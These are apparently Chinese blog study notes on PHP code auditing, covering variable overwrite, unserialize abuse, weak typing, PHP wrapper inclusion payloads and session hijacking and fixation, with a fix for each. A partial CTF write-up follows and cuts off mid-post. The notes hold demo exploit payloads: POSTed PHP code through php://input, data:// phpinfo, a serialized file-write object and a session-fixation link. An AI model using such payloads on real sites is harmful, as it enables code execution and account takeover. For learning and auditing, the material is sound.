<h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>结合其他漏洞攻击，覆盖白名单，控制没覆盖的未初始化变量导致SQL</p>
<p>常见危险函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">extract()</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">parse_str()</span><br><span class="line"></span><br><span class="line">import_request_variables()</span><br></pre></td></tr></table></figure>

<p>常见的遍历方式释放代码可能导致变量覆盖漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key=&gt;$_value)&#123;</span><br><span class="line">		$$_key = addslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>前提：register_globals = Off，（？为啥这么要求嘞，待解决）</p>
<p>extract()变量覆盖</p>
<p>int extract($array,extract_rules,prefix)</p>
<p>$array 关联的数组，受后面参数影响</p>
<p>extract_rules 对待非法/数字和冲突的键名的方法将根据取除标记</p>
<p>prefix 仅在第二个参数特殊时需要，添加前缀</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563369370804.png" alt="1563369370804"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract函数用来将一个数字分解成多个变量直接使用，下面是W3C的解释：PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。本函数返回成功设置的变量数目。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">'pwd'</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'username'</span>=&gt;<span class="string">'username'</span>,</span><br><span class="line">	<span class="string">'password'</span>=&gt;<span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'rand'</span> =&gt; <span class="string">'rand'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">extract($arr,EXTR_PREFIX_SAME,<span class="string">"pwd"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$usename,$password,$rant"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">","</span>.$pwd_password;  </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>“EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。”</strong></p>
<p>EXTR_IF_EXISTS 似乎同上</p>
<p>parse_str()变量覆盖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void parse_str(string $encoded_string[,array $result])</span><br></pre></td></tr></table></figure>

<p>$encoded_string 输入的字符串</p>
<p>$result 变量将以数组元素的形式存入到这个数组，作为替代</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个很暴力</span><br><span class="line">$a = b</span><br><span class="line">parse_str($a = &apos;n&apos;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>import_request_variables()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variable(string $type[,string $prefix])</span><br></pre></td></tr></table></figure>

<p>$type 指定需要导入的变量，可用字母G,P,C代表GET POST COOKIE</p>
<p>$prefix    变量名前缀</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &apos;0&apos;;</span><br><span class="line">import_request_varibles(&apos;G&apos;);	//相当于开启全局变量注册</span><br><span class="line">if($a = 1)&#123;</span><br><span class="line">	echo &apos;success&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &apos;fail&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;?a=1             #变量覆盖成功</span><br></pre></td></tr></table></figure>

<p>修复方案</p>
<ol>
<li>在php.ini文件设置register_globals=Off</li>
<li>使用原始变量数组，如$_POST,$_GET等数组变量进行操作</li>
<li>不使用foreach语句来遍历$_GET变量，而改用[(index)]来制定  （？还是不懂，觉得上面的案例是$$的，待解决）</li>
<li>注册变量前先判断变量是否存在，（就是不用extract这个函数了呗）</li>
</ol>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>序列化：把对象转换为字节序列的过程，成为对象的序列化</p>
<p>反序列化：把字节序列恢复为对象的过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test1=<span class="string">"SQYY 1028"</span>;</span><br><span class="line">$test2=<span class="keyword">array</span>(<span class="string">"SQYY"</span>,<span class="number">1028</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($test1);			&gt;s:<span class="number">9</span>:<span class="string">"SQYY 1028"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($test2);			&gt;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"SQYY"</span>;i:<span class="number">1</span>;i:<span class="number">1028</span>;&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>漏洞成因</p>
<p>反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，</p>
<p>漏洞根据不同的代码可以导致各种攻击，如代码注入，SQL注入、目录遍历等等</p>
<p>序列化的不同结果：1. public 2. private 3. protect</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">public</span> $test2 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test3 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($test());</span><br><span class="line">&gt;</span><br><span class="line">    </span><br><span class="line">&gt;O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">11</span>:<span class="string">"testtest1"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">8</span>:<span class="string">"*test3"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞本质</p>
<p>unserialize函数的变量可控</p>
<p>php文件中存在可利用类，类中有魔术方法</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563373599421.png" alt="1563373599421"></p>
<p>导致代码执行的漏洞( __destruct() )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct() 　　- 对象的所有引用都被删除或者当对象被显式销毁时执行</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a = <span class="string">'test'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $fp = fopen(<span class="string">"E:\\Local Test\www\hello.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">        fputs($fp,<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line">$obj = unserialize($_POST[<span class="string">'obj'</span>]);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"E:\\Local Test\www\hello.php"</span>;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post:obj=O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:18:&quot;&lt;?php&gt; phpinfo();?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>因为反序列化obj时，执行了魔术方法，__destruct(),从而引发了文件写入；</p>
<p>漏洞成因，存在魔术方法，魔术方法中的a可控，</p>
<p>防御思路：不用魔术方法，或者使得魔术方法中的变量、代码 用户不可控。</p>
<h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h3><p>标准类型：布尔、整型、浮点、字符串</p>
<p>复杂类型：数组、对象</p>
<p>特殊类型：资源 resource</p>
<ol>
<li><p>字符串和数字比较：字符串第一个不为数字前的数字为字符串的值</p>
</li>
<li><p>数字、字符串 和 数组比较，永假</p>
</li>
<li><p>科学计数法的比较，同第一条</p>
</li>
<li><p>==弱类型，===强类型</p>
</li>
</ol>
<p>empty()：变量为0，”0“，null，‘’，false，array()，返回ture</p>
<p>isset：变量未定义或者为null时，返回false</p>
<p>md5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string md5(string $str[,boo $raw_output = false])</span><br></pre></td></tr></table></figure>

<p>绕过：传入数组（非字符串），返回为NULL</p>
<p>函数strcmp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp(string $str1, string $str2)</span><br></pre></td></tr></table></figure>

<p>绕过，传入数组（非字符串），返回为0    （字符相同返回为0）</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563416371109.png" alt="1563416371109"></p>
<p>switch    会将参数转化为整型，（ ‘67sfajf ’  -&gt;  67 ）</p>
<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p>file:// 协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<p>执行文件内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file://E:Local Test\WWW\1.txt</span><br></pre></td></tr></table></figure>

<p>php://filter</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<p>读取文件内容，base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=conver.base64-encode/resource=./1.txt</span><br></pre></td></tr></table></figure>

<p>php://input 可以访问请求的原始数据的只读流</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  on</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:file.php?file=php://input</span><br><span class="line">post:&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>写入文件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:file.php?file=php://input</span><br><span class="line">post:&lt;?php fputs(fopen(&quot;1.txt&quot;,&quot;w&quot;),&quot;1234&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<p>(觉着就是，执行你post的代码，还认为你post的代码是从文件中提取出来的)</p>
<p>data://协议</p>
<p>allow_url_fopen   :  on</p>
<p>allow_url_include   :  on</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http://localhost/test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">http://localhost/test.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http://localhost/test.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>

<p>zip://协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=zip://D:/phpStudy/WWW/txf.zip%23txf.txt</span><br></pre></td></tr></table></figure>

<p>bzip2://协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=compress.zlib://./txf.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563417336599.png" alt="1563417336599"></p>
<p>phar://伪协议</p>
<p>首先我们要用phar类打包一个phar标准包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = new PharData(dirname(__FILE__).&apos;/phartest2.zip&apos;, 0,&apos;phartest2&apos;,Phar::ZIP) ; </span><br><span class="line">$x=file_get_contents(&apos;./php.php&apos;);</span><br><span class="line">$p-&gt;addFromString(&apos;a.jpg&apos;, </span><br><span class="line">$x); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>会生成一个zip的压缩文件。然后我们构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/file.php?file=phar://php.zip/php.jpg</span><br></pre></td></tr></table></figure>

<p>也可以直接shell</p>
<p>其中phar适用范围为php&gt;5.3.0</p>
<p>以下的这种包含方式在这样的情况下是无效的。</p>
<p>include(一个规定的路径+可控点)            (?没太理解，待解决)</p>
<h3 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a>会话认证漏洞</h3><p>Session 固定动机</p>
<p>Session 劫持攻击</p>
<p>挖掘经验</p>
<p>遇到的比较多的就是出现在cookie验证上，通常是没有使用session来认证，直接将用户信息保存在cookie中</p>
<p>劫持攻击</p>
<p>劫持目标用户的session id来获取网站服务器上未经许可的存取信息，窃取目标用户等cookie数据，来取得网站的认可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_POST[&apos;login&apos;]))&#123;</span><br><span class="line">	$username = $_POST[&apos;username&apos;];</span><br><span class="line">    $password = $_POST[&apos;password</span><br><span class="line">    $con = 	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">	mysql_select_db(&apos;admin&apos;,$conn);</span><br><span class="line">	$sql = &quot;SELECT* FROM admin WHERE username =&apos; &quot;.$_username.&quot;&apos;&quot;;</span><br><span class="line">	$request = mysql_query($sql) or die(&quot;fail&quot;).mysql_error();</span><br><span class="line">	if($row = mysql_num_rows($result))&#123;</span><br><span class="line">    $_SESSION[&apos;username&apos;]=$username;</span><br><span class="line">    $_SESSION[&apos;password&apos;]=$password;</span><br><span class="line">    $_SESSIon[&apos;book&apos;] = 1;</span><br><span class="line">    header(&quot;localhost:http//127.0.0.1/member.php?user=&quot;.$username);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form method = &apos;post&apos; name=&apos;form&apos;&gt;</span><br><span class="line">            账号：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;</span><br><span class="line">            密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;</span><br><span class="line">            &lt;input type = &quot;submit&quot; name=&apos;login&apos;/&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'session_id '</span>. session_id().<span class="string">"&lt;br/ &gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'name: '</span>. $_GET[<span class="string">'user'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"book_num"</span>. $_SESSION[<span class="string">'book'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于回显了session_id，</p>
<p>攻击脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'session_id '</span>. session_id().<span class="string">"&lt;br/ &gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'name: '</span>. $_SESSION[<span class="string">'username'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"book_num"</span>. $_SESSION[<span class="string">'book'</span>]=<span class="number">2000.</span><span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:/attak.php?PHPSESSIONID=jdisoay8hdsiaf8yqr89fu39</span><br></pre></td></tr></table></figure>

<p>由于id的泄露，导致攻击者更改了该事件中的book数量。</p>
<p>修复方案：</p>
<ol>
<li>使用随机而且长度够大的数字或字符串来充当session_id</li>
<li>将网页之间传递的数据使用某种形式进行封装，特别是session_id</li>
<li>更改session名称</li>
<li>注销后即销毁session的所数据</li>
</ol>
<p>Session固定攻击</p>
<p>黑客固定住目标用户的session_id，因此目标用户所使用的session可有攻击者指定</p>
<p>（即目标用户用了黑客的session存取数据，黑客再用该session，读取目标的数据）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">有这么一个场景，当管理员登陆之后，程序生成一个认证session，而此时的session是没有指定session_id的。如果存在一个接口能够让我们指定session_id，那么我们就可以在设置一个session_id连接到这个已经认证的session上去。</span><br><span class="line"></span><br><span class="line">构造一个请求设置session_id的链接让管理员点击，那么我们就拥有了管理员的权限。（CSRF）</span><br><span class="line"></span><br><span class="line">在攻击成功之后，怎么设置我们的session_id呢？</span><br><span class="line"></span><br><span class="line">其实就是我们前端经常看到的这个东西。</span><br><span class="line"></span><br><span class="line">PHPSESSID=fdpmos0quo6o7rq69h6v1u6i50;</span><br><span class="line">攻击成功之后，设置PHPSESSID=你自己设置的session_id，然后带着这个cookie请求即可访问后台。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请求后台任意需要认证的页面都是会调用session()方法，而且sessionid的接收是REQUEST方式，那么我们只要让登陆后台的管理员点击类似这样的链接，就可以拿到后台的权限了。</span><br><span class="line"></span><br><span class="line">http://demo.yxcms.com/index.php?r=admin/index/index&amp;sessionid=123test</span><br><span class="line"></span><br><span class="line">要让管理员登陆状态下点你的链接，最好的方法是找到个后台的xss啦。</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://xz.aliyun.com/t/2025" target="_blank" rel="noopener">https://xz.aliyun.com/t/2025</a></p>
<p>修复方案</p>
<ol>
<li><p>不要从GET/POST变量中接受session_id</p>
</li>
<li><p>调用session_start函数后，立即生成新的session_id，并删除就得session</p>
</li>
<li><p>将session_id存放在cookie内</p>
</li>
<li><p>注销后即销毁session的所有数据</p>
</li>
<li><p>使用时间戳来记录session的使用时间，如果两次session的相差时间太长，就销毁session的所有数据</p>
</li>
<li><p>检查用户的ip地址，如果ip地址改变就产生新的session_id</p>
<p>且删除旧的session</p>
</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/14/赛博杯2019_Write_Up/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="V">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="V's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/14/赛博杯2019_Write_Up/" itemprop="url">赛博杯2019_Write_Up</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-14T16:22:35+08:00">
                2019-07-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="赛博杯2019-Write-Up"><a href="#赛博杯2019-Write-Up" class="headerlink" title="赛博杯2019 Write Up"></a>赛博杯2019 Write Up</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>杭电赛博协会出得题，感觉质量还是不错的，难易兼备。以下是比赛题目部分Write Up。</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/1.png" alt="1"></p>
<p>扫条形码得到flag。</p>
<h3 id="No-Word"><a href="#No-Word" class="headerlink" title="No Word"></a>No Word</h3><p>snow加密，将文件放入010editor看他的十六进制形式，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/2.png" alt="2"></p>
<p>0D0A是换行，剩下的将20转0，将09转1，得到的二进制数据，转字符串即可得到flag。</p>
<h3 id="基础社工"><a href="#基础社工" class="headerlink" title="基础社工"></a>基础社工</h3><p>题目介绍：大家都用着我们的数字杭电（<a href="http://i.hdu.edu.cn/" target="_blank" rel="noopener">i.hdu.edu.cn</a>)但是对于其注册者却啥也不知道，所以小y打算去看看注册数字杭电的创始人的邮箱</p>
<p>flag形式为：flag{你找到的电子邮箱}</p>
<p>百度一个IP反查询工具，Whois查询，看看这个IP的备案，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/3.png" alt="3"></p>
<p>得到flag；</p>
<h3 id="The-world"><a href="#The-world" class="headerlink" title="The world"></a>The world</h3><p>下载得到一张图，猜测是隐写，直接foremost分解，得到四张图，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/4.png" alt="4"></p>
<p>第一张是可见的，应该没用，剩下来的，按顺序看。</p>
<p>第一份压缩包是加密压缩包，看了一下不是伪加密，于是放入工具进行简单爆破，得到密码abc123，得到文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d2abd3fb9d4c93fb064abf81f5fab84</span><br><span class="line">新手村钥匙</span><br></pre></td></tr></table></figure>

<p>第二份文件是一张图，猜测是LSB隐写，密码为上述字符串，测试后发现不是。继续考虑，可能是outguess加密，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r flag.jpg -t secret.txt -k d2abd3fb9d4c93fb064abf81f5fab84</span><br></pre></td></tr></table></figure>

<p>得到文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">95cca6c50e48e86c468ee329ddc11047</span><br><span class="line"></span><br><span class="line">最后一关大门的钥匙</span><br></pre></td></tr></table></figure>

<p>第三份文件是一个mp3文件，猜测是MP3隐写，用MP3Stego解密，即可得到flag</p>
<h3 id="Different-P"><a href="#Different-P" class="headerlink" title="Different_P"></a>Different_P</h3><p>hint：PIL是个好东西</p>
<p>下载得到两份一样的文件，试了试盲水印，发现没有用。使用Beyond Compare 4结合后发现<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/5.png" alt="5"></p>
<p>字符这里有点东西。根据题目提示，猜测要将两张图片的所有元素点的灰度拿来作比较，</p>
<p>构造脚本如下</p>
